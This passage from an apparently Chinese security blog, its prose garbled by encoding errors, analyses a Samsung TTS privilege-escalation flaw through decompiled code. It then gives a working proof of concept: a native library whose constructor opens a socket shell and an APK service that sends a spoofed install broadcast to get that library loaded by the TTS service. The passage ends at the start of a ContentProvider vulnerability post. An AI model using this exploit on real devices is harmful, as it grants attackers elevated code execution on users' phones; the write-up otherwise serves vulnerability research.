class="line">                    LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).add(<span class="keyword">new</span> <span class="title class_">LangPackMgr$UpdateEngineInfo</span>(v0_1, v2));</span><br><span class="line">                    CLog.i(CLog$eLEVEL.D, <span class="string">&quot;LangPackMgr - Add candidate engine [%d][%s]&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Integer.valueOf(v0_1), v2&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    CLog.e(<span class="string">&quot;LangPackMgr - Invalid engine = &quot;</span> + v2);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">            LangPackMgr.decreaseTriggerCount(<span class="built_in">this</span>.a);</span><br><span class="line">            <span class="keyword">if</span>(LangPackMgr.getTriggerPackageCount(<span class="built_in">this</span>.a) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).size() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            LangPackMgr.doUpdateEngine(<span class="built_in">this</span>.a);  <span class="comment">// 2</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.mThreadUpdateEngine == <span class="literal">null</span> || !<span class="built_in">this</span>.mThreadUpdateEngine.isAlive()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.mThreadUpdateEngine = <span class="keyword">new</span> <span class="title class_">LangPackMgr$EngineUpdateThread</span>(<span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="built_in">this</span>.mThreadUpdateEngine.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">        LangPackMgr$EngineUpdateThread(LangPackMgr arg1, LangPackMgr$<span class="number">1</span> arg2) &#123;</span><br><span class="line">        <span class="built_in">this</span>(arg1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">if</span>(LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).size() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            v1 = LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).poll();</span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).size() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">goto</span> label_20;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).poll();</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">            <span class="keyword">if</span>(v1 != <span class="literal">null</span> &amp;&amp; ((LangPackMgr$UpdateEngineInfo)v1).VERSION &gt; SmtTTS.get().getEngineVersion()) &#123;</span><br><span class="line">                CHelper.get().set_INSTALLED_ENGINE_PATH(((LangPackMgr$UpdateEngineInfo)v1).PATH);</span><br><span class="line">                <span class="keyword">if</span>(SmtTTS.get().reloadEngine()) &#123;</span><br><span class="line">                </span><br><span class="line">-----</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">reloadEngine</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">        <span class="built_in">this</span>.stop();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">v0_2</span> <span class="operator">=</span> CHelper.get().INSTALLED_ENGINE_PATH();</span><br><span class="line">            <span class="keyword">if</span>(CString.isValid(v0_2)) &#123;</span><br><span class="line">                System.load(v0_2); <span class="comment">// &lt;- triggers load</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">goto</span> label_70;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šå¯çŸ¥ï¼š</p>
<ul>
<li><code>SMT_ENGINE_VERSION</code>åº”è¯¥å¤§äºå†…ç½®çš„ç‰ˆæœ¬361811291ï¼›</li>
<li><code>mTriggerCount</code>åº”è¯¥é¦–å…ˆè¢«å¢åŠ ï¼Œå¯ä»¥é€šè¿‡æä¾›ä¸€ä¸ªåŒ…åä»¥<code>com.samsung.SMT.lang</code>å¼€å§‹çš„åŒ…å®ç°ã€‚<code>com.samsung.SMT.SamsungTTSService</code>æ³¨å†Œäº†ä¸¤ä¸ª<code>receiver</code>ï¼Œå…¶ä¸­ä¸€ä¸ªç”¨äºæ‰«æåŒ…çš„å‰ç¼€ï¼Œå¹¶å¢åŠ <code>mTriggerCount</code>ã€‚</li>
</ul>
<p>ä¸‹é¢çš„ä»£ç å°†è°ƒç”¨æ¶æ„æœåŠ¡è€Œä¸éœ€è¦äº¤äº’ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.SMT.mgr;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LangPackMgr$1</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    LangPackMgr$<span class="number">1</span>(LangPackMgr arg1) &#123;</span><br><span class="line">        <span class="built_in">this</span>.a = arg1;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context arg4, Intent arg5)</span> &#123;  <span class="comment">// ç›‘å¬åŒ…å®‰è£…å¸è½½</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">v0</span> <span class="operator">=</span> arg5.getAction();</span><br><span class="line">        <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> arg5.getData().getSchemeSpecificPart();</span><br><span class="line">        <span class="keyword">if</span>(((v0.equals(<span class="string">&quot;android.intent.action.PACKAGE_ADDED&quot;</span>)) || (v0.equals(<span class="string">&quot;android.intent.action.PACKAGE_CHANGED&quot;</span>)) || (v0.equals(<span class="string">&quot;android.intent.action.PACKAGE_REMOVED&quot;</span>))) &amp;&amp; (v1 != <span class="literal">null</span> &amp;&amp; (v1.startsWith(<span class="string">&quot;com.samsung.SMT.lang&quot;</span>)))) &#123;</span><br><span class="line">            <span class="built_in">this</span>.a.syncLanguagePack();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">triggerLanguagePack</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.mThreadTriggerLanguagePack == <span class="literal">null</span> || !<span class="built_in">this</span>.mThreadTriggerLanguagePack.isAlive()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.mThreadTriggerLanguagePack = <span class="keyword">new</span> <span class="title class_">LangPackMgr$LanguagePackTriggerThread</span>(<span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="built_in">this</span>.mThreadTriggerLanguagePack.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.SMT.mgr;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LangPackMgr$LanguagePackTriggerThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        Object v0_1;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">v5</span> <span class="operator">=</span> LangPackMgr.f(<span class="built_in">this</span>.langpackmgr).getPackageManager().getInstalledPackages(<span class="number">0x2000</span>).iterator();</span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">                <span class="keyword">if</span>(!((PackageInfo)v0_1).packageName.startsWith(<span class="string">&quot;com.samsung.SMT.lang&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">            <span class="keyword">goto</span> label_53;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">v1_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(((PackageInfo)v0_1).packageName);</span><br><span class="line">            v1_1.setPackage(((PackageInfo)v0_1).packageName);</span><br><span class="line">            LangPackMgr.f(<span class="built_in">this</span>.langpackmgr).startService(v1_1);  <span class="comment">// å¯åŠ¨å¯¹åº”çš„APPçš„æœåŠ¡</span></span><br><span class="line">            LangPackMgr.increaseTriggerCount(<span class="built_in">this</span>.langpackmgr);</span><br></pre></td></tr></table></figure>

<p><code>Samsung TTS</code>åŠ è½½çš„åº“éœ€è¦å®ç°ä¸€ä¸ªæ¥å£ï¼Œä»¥çœ‹ä¸Šå»åƒä¸€ä¸ª<code>language pack</code>ï¼Œè¿™ä¸ªé€šè¿‡é€†å‘é»˜è®¤çš„åº“æ¥å®ç°ã€‚</p>
<p>æœ€ç»ˆçš„æµç¨‹å¦‚ä¸‹ï¼š</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/smt-flow.png" alt="smt-flow" style="zoom: 75%;" />

<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><h2 id="soåº“ç¼–å†™"><a href="#soåº“ç¼–å†™" class="headerlink" title="soåº“ç¼–å†™"></a>soåº“ç¼–å†™</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGE(...) __android_log_print(ANDROID_LOG_ERROR  , <span class="string">&quot;mercury-native&quot;</span>, __VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">Java_com_samsung_SMT_engine_SmtTTS_initialize</span> <span class="params">( JNIEnv* env,</span></span><br><span class="line"><span class="params">                                                  jobject thiz )</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// int setLanguage(String arg1, String arg2, String arg3, String arg4, int arg5, int arg6) </span></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">Java_com_samsung_SMT_engine_SmtTTS_setLanguage</span><span class="params">(JNIEnv* env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//(java.lang.String, java.lang.String, java.lang.String, java.lang.String, int, int)</span></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint <span class="title function_">Java_com_samsung_SMT_engine_SmtTTS_getIsLanguageAvailable</span><span class="params">(JNIEnv* env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">doload</span><span class="params">()</span> &#123;</span><br><span class="line">  LOGE(<span class="string">&quot;SMTEXP: my uid is %d, pid is %d&quot;</span>, getuid(), getpid());</span><br><span class="line">  run_socket_sh_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="APKç¼–å†™"><a href="#APKç¼–å†™" class="headerlink" title="APKç¼–å†™"></a>APKç¼–å†™</h2><p>æ³¨å†Œä¸€ä¸ªæœåŠ¡ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.SMT.lang.poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Service;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyService</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyService</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">copyfile</span><span class="params">(String input, String output)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">myOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(output);</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> length;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">myInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(input);</span><br><span class="line">        <span class="keyword">while</span> ((length = myInput.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            myOutput.write(buffer, <span class="number">0</span>, length);</span><br><span class="line">        &#125;</span><br><span class="line">        myInput.close();</span><br><span class="line">        myOutput.flush();</span><br><span class="line">        myOutput.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> <span class="built_in">this</span>.getApplicationInfo().nativeLibraryDir + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;libmstring.so&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> <span class="string">&quot;/data/data/com.samsung.SMT.lang.poc/libmstring.so&quot;</span>;</span><br><span class="line">      </span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    copyfile(input, output);</span><br><span class="line">                    Runtime.getRuntime().exec(<span class="string">&quot;chmod 777 &quot;</span> + output);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">bi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                bi.setAction(<span class="string">&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;</span>);</span><br><span class="line">                ArrayList&lt;CharSequence&gt; s = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                bi.putCharSequenceArrayListExtra(<span class="string">&quot;BROADCAST_CURRENT_LANGUAGE_INFO&quot;</span>, s);</span><br><span class="line">                bi.putExtra(<span class="string">&quot;BROADCAST_CURRENT_LANGUAGE_VERSION&quot;</span>, <span class="string">&quot;99999&quot;</span>);</span><br><span class="line">                bi.putCharSequenceArrayListExtra(<span class="string">&quot;BROADCAST_DB_FILELIST&quot;</span>, s);</span><br><span class="line">                bi.putExtra(<span class="string">&quot;SMT_ENGINE_VERSION&quot;</span>, <span class="number">0x2590cd5b</span>);<span class="comment">//installed version is 361811291</span></span><br><span class="line">                bi.putExtra(<span class="string">&quot;SMT_ENGINE_PATH&quot;</span>, input);</span><br><span class="line">                sendBroadcast(bi);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-06-12T09:40:48.000Z" title="2022/6/12 17:40:48">2022-06-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-06-14T10:31:26.569Z" title="2022/6/14 18:31:26">2022-06-14</time></span><span class="level-item">6 minutes read (About 951 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/06/12/ContentProvider%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/">ContentProvideræ¼æ´ç¬”è®°</a></p><div class="content"><h1 id="ContentProviderä»‹ç»"><a href="#ContentProviderä»‹ç»" class="headerlink" title="ContentProviderä»‹ç»"></a>ContentProviderä»‹ç»</h1><p><code>ContentProvider</code>çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºåº”ç”¨ç¨‹åºä¹‹é—´å…±äº«æ•°æ®æä¾›æ¸ é“ã€‚<code>ContentProvider</code>ä»¥ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨çš„å½¢å¼å°†æ•°æ®å‘ˆç°ç»™å¤–éƒ¨åº”ç”¨ï¼Œè¿™äº›è¡¨ä¸å…³ç³»å‹æ•°æ®åº“ä¸­çš„è¡¨ç±»ä¼¼ã€‚è¡Œè¡¨ç¤ºæä¾›ç¨‹åºæ”¶é›†çš„æŸç§ç±»å‹æ•°æ®çš„å®ä¾‹ï¼Œè¡Œä¸­çš„æ¯ä¸€åˆ—è¡¨ç¤ºä¸ºä¸€ä¸ªå®ä¾‹æ‰€æ”¶é›†çš„å•ä¸ªæ•°æ®ã€‚</p>
<p>å…¶ä»–ç»„ä»¶å’Œ <code>ContentProvider</code>ä¹‹é—´çš„å…³ç³»ï¼š</p>
<p><img src="https://developer.android.com/guide/topics/providers/images/content-provider-tech-stack.png?hl=zh-cn" alt="å†…å®¹æä¾›ç¨‹åºä¸å…¶ä»–ç»„ä»¶çš„å…³ç³»ã€‚"></p>
<h2 id="è®¿é—®æ–¹å¼"><a href="#è®¿é—®æ–¹å¼" class="headerlink" title="è®¿é—®æ–¹å¼"></a>è®¿é—®æ–¹å¼</h2><p><img src="https://developer.android.com/guide/topics/providers/images/content-provider-interaction.png?hl=zh-cn" alt="å†…å®¹æä¾›ç¨‹åºã€å…¶ä»–ç±»å’Œå­˜å‚¨ç©ºé—´ä¹‹é—´çš„äº¤äº’ã€‚"></p>
<p>ç¤ºä¾‹ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ContentResolver</span> <span class="variable">res</span> <span class="operator">=</span> <span class="built_in">this</span>.getContentResolver();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> minId; id &lt; maxId; id++) &#123;</span><br><span class="line">            <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(PUBLIC_DOWNLOADS_ID_URI + id);</span><br><span class="line">            <span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> res.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (cur != <span class="literal">null</span> &amp;&amp; cur.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    lastId = Math.max(id, lastId);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">                    cur.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Content-URI"><a href="#Content-URI" class="headerlink" title="Content URI"></a>Content URI</h2><p><strong>å†…å®¹ URI</strong> ç”¨æ¥æ ‡è¯†æ•°æ®ã€‚å†…å®¹ URI åŒ…æ‹¬æ•´ä¸ªæä¾›ç¨‹åºçš„ç¬¦å·åç§°ï¼ˆå…¶ <strong>æˆæƒ</strong> ï¼‰å’ŒæŒ‡å‘è¡¨çš„åç§°ï¼ˆ <strong>è·¯å¾„</strong> ï¼‰ã€‚æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content:<span class="comment">//user_dictionary/words</span></span><br></pre></td></tr></table></figure>

<h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p><code>ContentProvider</code>æä¾›çš„ <code>API</code>ç±»ä¼¼äº <code>SQL</code>è¯­å¥ï¼Œä¸»è¦æœ‰ <code>query</code>ã€<code>insert</code>ã€<code>update</code>ã€<code>delete</code>å’Œ <code>getType</code>ç­‰ã€‚</p>
<h3 id="query"><a href="#query" class="headerlink" title="query()"></a>query()</h3><p><a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/ContentResolver?hl=zh-cn#query(android.net.Uri,%20java.lang.String%5B%5D,%20android.os.Bundle,%20android.os.CancellationSignal)"><code>ContentResolver.query()</code></a> -&gt; <a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/ContentProvider?hl=zh-cn#query(android.net.Uri,%20java.lang.String%5B%5D,%20android.os.Bundle,%20android.os.CancellationSignal)"><code>ContentProvider.query()</code></a>ï¼Œç¤ºä¾‹ä»£ç ï¼š</p>
